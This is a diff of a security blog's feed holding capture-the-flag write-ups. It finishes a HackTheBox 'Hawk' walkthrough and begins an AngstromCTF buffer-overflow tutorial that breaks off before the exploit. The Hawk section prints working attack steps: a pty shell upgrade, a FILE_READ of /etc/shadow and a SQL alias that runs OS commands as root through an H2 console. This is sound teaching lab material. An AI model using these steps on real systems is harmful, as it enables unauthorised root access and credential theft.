+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;GCC 7.3.0] on linux
+Type &lt;span class=&quot;s2&quot;&gt;&quot;help&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;copyright&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;credits&quot;&lt;/span&gt; or &lt;span class=&quot;s2&quot;&gt;&quot;license&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;more information.
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; import pty
+import pty
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; pty.spawn&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/bin/bash'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+pty.spawn&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/bin/bash'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+daniel@hawk:/var/www/html&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Nothing prevents us to get the user flag anymore!&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;daniel@hawk:/var/www/html&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /home/daniel/user.txt
+&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /home/daniel/user.txt
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;REDACTED]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;As we’ve seen during our recon, an SSH server is running and we can use to directly login as daniel. A nice checkpoint allowed by the author of the box :wink:.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;elevating-privileges&quot;&gt;Elevating privileges&lt;/h2&gt;
+
+&lt;p&gt;We are now connected as &lt;em&gt;daniel&lt;/em&gt; via &lt;strong&gt;SSH&lt;/strong&gt;. We can start the &lt;strong&gt;enumeration process&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;
+
+&lt;p&gt;When looking for a way to escalate privileges on machine, I like to run a tool like &lt;a href=&quot;https://github.com/rebootuser/LinEnum&quot;&gt;LinEnum.sh&lt;/a&gt; in the background while I fuzz the machine manually.&lt;/p&gt;
+
+&lt;p&gt;Do you remember the &lt;strong&gt;H2 Database console&lt;/strong&gt; we saw with the &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan? &lt;span style=&quot;color:Red&quot;&gt;It is running as root on Hawk…&lt;/span&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;daniel@hawk:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ps &lt;span class=&quot;nt&quot;&gt;-aux&lt;/span&gt; |grep h2
+root        801  0.0  0.0   4628   808 ?        Ss   Nov30   0:00 /bin/sh &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /usr/bin/java &lt;span class=&quot;nt&quot;&gt;-jar&lt;/span&gt; /opt/h2/bin/h2-1.4.196.jar
+root        802  0.0  5.7 2345696 56448 ?       Sl   Nov30   1:28 /usr/bin/java &lt;span class=&quot;nt&quot;&gt;-jar&lt;/span&gt; /opt/h2/bin/h2-1.4.196.jar
+daniel    21347  0.0  0.1  13136  1012 pts/2    S+   18:57   0:00 &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;h2
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Are you thinking what I am thinking?&lt;/p&gt;
+
+&lt;p&gt;When trying to access it in a web browser, it says: &lt;span style=&quot;color:Maroon&quot;&gt;&lt;em&gt;“Sorry, remote connections (‘webAllowOthers’) are disabled on this server.”&lt;/em&gt;&lt;/span&gt; :cry:&lt;/p&gt;
+
+&lt;h3 id=&quot;ssh-port-forwarding&quot;&gt;SSH Port Forwarding&lt;/h3&gt;
+
+&lt;p&gt;Now that we have a foot in the system, we can &lt;span style=&quot;color:Green&quot;&gt;initiate connections from the machine itself&lt;/span&gt;. Let’s verify this:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;daniel@hawk:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://127.0.0.1:8082
+&amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;DOCTYPE HTML PUBLIC &lt;span class=&quot;s2&quot;&gt;&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://www.w3.org/TR/html4/loose.dtd&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;
+Copyright 2004-2014 H2 Group. Multiple-Licensed under the MPL 2.0,
+and the EPL 1.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://h2database.com/html/license.html&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Initial Developer: H2 Group
+&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;
+    &amp;lt;meta http-equiv&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Content-Type&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;text/html;charset=utf-8&quot;&lt;/span&gt; /&amp;gt;
+    &amp;lt;title&amp;gt;H2 Console&amp;lt;/title&amp;gt;
+    &amp;lt;link &lt;span class=&quot;nv&quot;&gt;rel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;stylesheet&quot;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;text/css&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;stylesheet.css&quot;&lt;/span&gt; /&amp;gt;
+&amp;lt;script &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+location.href &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'login.jsp?jsessionid=c48d2804eb930787aff2325b9aba37dd'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&amp;lt;/script&amp;gt;
+&amp;lt;/head&amp;gt;
+&amp;lt;body &lt;span class=&quot;nv&quot;&gt;style&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;margin: 20px;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+
+&amp;lt;h1&amp;gt;Welcome to H2&amp;lt;/h1&amp;gt;
+&amp;lt;h2&amp;gt;No Javascript&amp;lt;/h2&amp;gt;
+If you are not automatically redirected to the login page, &lt;span class=&quot;k&quot;&gt;then
+&lt;/span&gt;Javascript is currently disabled or your browser does not support Javascript.
+For this application to work, Javascript is essential.
+Please &lt;span class=&quot;nb&quot;&gt;enable &lt;/span&gt;Javascript now, or use another web browser that supports it.
+
+&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;span style=&quot;color:Green&quot;&gt;Seems allowed when executed from the localhost!&lt;/span&gt; However, we don’t have access to a web browser on Hawk. This is why we need to use SSH port forwarding as follows: &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh -L 9000:localhost:8082 daniel@10.10.10.102&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;The english version is: “&lt;strong&gt;Forward&lt;/strong&gt; everything I send to port &lt;strong&gt;127.0.0.1:9000&lt;/strong&gt; to &lt;strong&gt;10.10.102:8082&lt;/strong&gt;”.&lt;/p&gt;
+
+&lt;p&gt;&lt;span style=&quot;color:Red&quot;&gt;Now, we should be able to access the H2 database console from our own web browser.&lt;/span&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;h2-database-console&quot;&gt;H2 Database Console&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-12-01/h2-db.png&quot; alt=&quot;H2 Database&quot; title=&quot;H2 database&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;When trying to connect to the &lt;strong&gt;default database&lt;/strong&gt; with &lt;strong&gt;default credentials&lt;/strong&gt;, it returns an error. &lt;span style=&quot;color:Green&quot;&gt;But what if we try to connect to a new database?&lt;/span&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-12-01/h2-boiteaklou.png&quot; alt=&quot;H2 New db&quot; title=&quot;H2 New db&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I changed the &lt;strong&gt;database URL&lt;/strong&gt; to a non-existing database and the connection test returns &lt;span style=&quot;color:Red&quot;&gt;“Success”&lt;/span&gt;. Now, &lt;span style=&quot;color:Green&quot;&gt;I can connect to this new database&lt;/span&gt;. From there, I can &lt;strong&gt;execute H2 functions&lt;/strong&gt; like &lt;code class=&quot;highlighter-rouge&quot;&gt;FILE_READ('/etc/shadow',NULL)&lt;/code&gt; for instance.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-12-01/h2-fileread.png&quot; alt=&quot;H2 File read&quot; title=&quot;H2 File read&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Replace &lt;strong&gt;/etc/shadow&lt;/strong&gt; by &lt;strong&gt;/root/root.txt&lt;/strong&gt; and you’ll &lt;span style=&quot;color:Green&quot;&gt;get the root flag!&lt;/span&gt; :checkered_flag:&lt;/p&gt;
+
+&lt;p&gt;Ok we can read protected files, but &lt;span style=&quot;color:Red&quot;&gt;can we get a root shell?&lt;/span&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;getting-a-root-shell&quot;&gt;Getting a Root Shell&lt;/h3&gt;
+
+&lt;p&gt;Still connected to our &lt;em&gt;boiteaklou database&lt;/em&gt;, we can &lt;strong&gt;create an alias&lt;/strong&gt; with the following command:&lt;/p&gt;
+
+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;CREATE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;ALIAS&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SHELLEXEC&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AS&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$$&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellexec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;java&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IOException&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;java&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;util&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Scanner&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;java&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;util&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Scanner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Runtime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getRuntime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getInputStream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;useDelimiter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;A&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hasNext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;}$$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Then, &lt;span style=&quot;color:Green&quot;&gt;we can trigger the code execution&lt;/span&gt; by &lt;strong&gt;calling this alias&lt;/strong&gt; and specifying our command as an argument:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-12-01/h2-rce.png&quot; alt=&quot;H2 RCE&quot; title=&quot;H2 RCE&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;span style=&quot;color:Green&quot;&gt;It’s kind of a root shell!&lt;/span&gt; If you want something more interactive, it can be done easily from what we have and I’m sure you will find a way :wink:&lt;/p&gt;
+
+&lt;p&gt;I hope you enjoyed this writeup and see you next time guys!&lt;/p&gt;
+
+&lt;p id=&quot;signature&quot;&gt;BoiteAKlou :hammer:&lt;/p&gt;</content><author><name>BoiteAKlou</name></author><summary type="html">Hawk has been retired from HackTheBox active machines so here is my writeup explaining how I rooted this machine. In this article, we will crack a salted OpenSSL encrypted file, upload a reverse shell to an instance of Drupal 7 CMS. Then, we will use a SSH port-forwarding trick to access a H2 database console disallowing remote connections and exploit this app to get root on the machine. Enjoy your reading!</summary></entry><entry><title type="html">Linux Privilege Escalation: Abusing shared libraries</title><link href="http://localhost:4000/Abusing-Shared-Libraries.html" rel="alternate" type="text/html" title="Linux Privilege Escalation: Abusing shared libraries" /><published>2018-11-21T13:00:00+01:00</published><updated>2018-11-21T13:00:00+01:00</updated><id>http://localhost:4000/Abusing-Shared-Libraries</id><content type="html" xml:base="http://localhost:4000/Abusing-Shared-Libraries.html">&lt;p&gt;Linux applications often use dynamically linked shared object libraries. These libraries allow code flexbility but they have their drawbacks… &lt;span style=&quot;color:Maroon&quot;&gt;In this article, we will study the weaknesses of shared libraries and how to exploit them in many different ways.&lt;/span&gt; Each exploit will be illustrated by a concrete example, which should make you understand how to reproduce it. I’ll give recommandations on how to protect your system against it in the final part of the article.
  &lt;!--excerpt--&gt;&lt;/p&gt;
 
 &lt;h1 class=&quot;no_toc&quot; id=&quot;table-of-contents&quot;&gt;Table of Contents&lt;/h1&gt;
@@ -2155,199 +2501,4 @@ We won’t need more than the first two equations in order to find the key.&lt;/
 
 &lt;p&gt;That’s it for this challenge but don’t worry, it was only the warm-up! :blush: Do not hesitate to leave a comment or to contact me for any question or inquiry.&lt;/p&gt;
 
-&lt;p id=&quot;signature&quot;&gt;BoiteAKlou :hammer:&lt;/p&gt;</content><author><name>BoiteAKlou</name></author><summary type="html">Here comes the first Cryptographic challenge! We’ll start with an easy one but nonetheless useful. We will establish the mathematical foundations needed for understanding more complicated codes such as RSA…</summary></entry><entry><title type="html">Introduction to Buffer Overflows: CookieJar - AngstromCTF</title><link href="http://localhost:4000/Introduction-to-Buffer-Overflows-CookieJar-AngstromCTF.html" rel="alternate" type="text/html" title="Introduction to Buffer Overflows: CookieJar - AngstromCTF" /><published>2018-06-05T08:35:00+02:00</published><updated>2018-06-05T08:35:00+02:00</updated><id>http://localhost:4000/Introduction-to-Buffer-Overflows-CookieJar-AngstromCTF</id><content type="html" xml:base="http://localhost:4000/Introduction-to-Buffer-Overflows-CookieJar-AngstromCTF.html">&lt;p&gt;For my first article on this blog, I’ll present you my write-up of “CookieJar” from the AngstromCTF. This challenge was accessible and very straight-forward, which constitutes the prefect opportunity to introduce &lt;strong&gt;Buffer Overflows&lt;/strong&gt;…
- &lt;!--excerpt--&gt;&lt;/p&gt;
-
-&lt;h1 class=&quot;no_toc&quot; id=&quot;table-of-contents&quot;&gt;Table of Contents&lt;/h1&gt;
-
-&lt;ul id=&quot;markdown-toc&quot;&gt;
-  &lt;li&gt;&lt;a href=&quot;#pre-requisites&quot; id=&quot;markdown-toc-pre-requisites&quot;&gt;Pre-requisites&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#challenge-description&quot; id=&quot;markdown-toc-challenge-description&quot;&gt;Challenge description&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#program-analysis&quot; id=&quot;markdown-toc-program-analysis&quot;&gt;Program analysis&lt;/a&gt;    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;#lets-run-it-&quot; id=&quot;markdown-toc-lets-run-it-&quot;&gt;Let’s run it !&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#source-code-dissection&quot; id=&quot;markdown-toc-source-code-dissection&quot;&gt;Source code dissection&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#vulnerabilty-explanation&quot; id=&quot;markdown-toc-vulnerabilty-explanation&quot;&gt;Vulnerabilty explanation&lt;/a&gt;    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;#what-is-a-buffer-overflow&quot; id=&quot;markdown-toc-what-is-a-buffer-overflow&quot;&gt;What is a buffer overflow?&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#what-does-it-involve&quot; id=&quot;markdown-toc-what-does-it-involve&quot;&gt;What does it involve?&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#detection-of-the-vulnerable-code&quot; id=&quot;markdown-toc-detection-of-the-vulnerable-code&quot;&gt;Detection of the vulnerable code&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#exploit&quot; id=&quot;markdown-toc-exploit&quot;&gt;Exploit&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;pre-requisites&quot;&gt;Pre-requisites&lt;/h2&gt;
-&lt;ul&gt;
-  &lt;li&gt;A very basic understanding of &lt;strong&gt;x86 or x64 architectures&lt;/strong&gt; will help you to grasp the concept of buffer overflow.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;challenge-description&quot;&gt;Challenge description&lt;/h2&gt;
-&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-06-05/challenge.png&quot; alt=&quot;challenge statement&quot; title=&quot;Statement&quot; width=&quot;80%&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;We have &lt;a href=&quot;/assets/2018-06-05/cookiePublic64&quot;&gt;a binary&lt;/a&gt; and the corresponding &lt;a href=&quot;/assets/2018-06-05/cookiePublic.c&quot;&gt;source code&lt;/a&gt; given for this challenge. The objective is to find a way to exploit this binary locally and to re-use the same exploit on the remote server in order to get the flag.&lt;/p&gt;
-
-&lt;p&gt;The first thing we should do in this case is to analyze the program and its source code.&lt;/p&gt;
-
-&lt;h2 id=&quot;program-analysis&quot;&gt;Program analysis&lt;/h2&gt;
-&lt;h3 id=&quot;lets-run-it-&quot;&gt;Let’s run it !&lt;/h3&gt;
-
-&lt;p&gt;Here is a standard execution:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@csb:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./cookiePublic64
-Welcome to the Cookie Jar program!
-
-In order to get the flag, you will need to have 100 cookies!
-
-So, how many cookies are there &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the cookie jar:
-&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 100
-Sorry, you only had 0 cookies, try again!
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;The program asks for an number of cookies in the jar but no matter what we submit, it seems that we are stuck with 0 cookies.&lt;/p&gt;
-
-&lt;p&gt;Alright, now let’s dive into the code!&lt;/p&gt;
-
-&lt;h3 id=&quot;source-code-dissection&quot;&gt;Source code dissection&lt;/h3&gt;
-
-&lt;p&gt;The code is pretty simple so the vulnerability should jump out.&lt;/p&gt;
-
-&lt;p&gt;Don’t pay attention to the first part of the main function, it only sets the execution rights of the program.&lt;/p&gt;
-
-&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;gid_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getegid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;setresgid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Here are the noticeable parts:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;A variable named &lt;strong&gt;numCookies&lt;/strong&gt; is declared and initialized with 0.
-    &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;numCookies&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;A buffer is declared with a size of 64 characters for storing the user input.
-    &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;A simple check is done on &lt;strong&gt;numCookies&lt;/strong&gt; and displays the &lt;strong&gt;flag&lt;/strong&gt; if numCookies&amp;gt;=100.
-    &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;numCookies&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
-      &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Congrats, you have %d cookies!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;numCookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-      &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Here's your flag: %s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FLAG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-      &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Sorry, you only had %d cookies, try again!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;numCookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;All of this seems pretty legit but there’s no way to increment this variable… We’re probably missing something.&lt;/p&gt;
-
-&lt;h2 id=&quot;vulnerabilty-explanation&quot;&gt;Vulnerabilty explanation&lt;/h2&gt;
-
-&lt;p&gt;I’ll give you a hint:&lt;/p&gt;
